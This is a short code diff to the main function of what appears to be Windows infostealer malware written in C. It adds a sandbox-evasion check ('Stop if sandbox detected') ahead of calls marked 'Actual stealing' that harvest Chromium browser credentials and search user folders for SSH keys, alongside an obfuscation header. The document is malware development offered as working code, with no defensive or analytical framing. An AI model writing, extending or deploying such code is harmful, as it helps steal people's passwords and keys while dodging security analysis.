@@ -5,6 +5,7 @@
 #include <string.h>
 #include <windows.h>
 
+#include "hardware_requirements.h"
 #include "chromium.h"
 #include "find_ssh_key.h"
 #include "obfuscation.h"
@@ -16,6 +17,13 @@ int main(void) {
   // Allows us to print non-ASCII characters for debug
   SetConsoleOutputCP(CP_UTF8);
 
+  // Stop if sandbox detected
+  if (check_hardware() == EXIT_FAILURE){
+    fprintf(stderr, "Hardware requirements check Failed: ");
+    return EXIT_FAILURE;
+  }
+
+  // Actual stealing
   hello();
   steal_chromium_creds();
   find_ssh_key(L"C:\\Users");
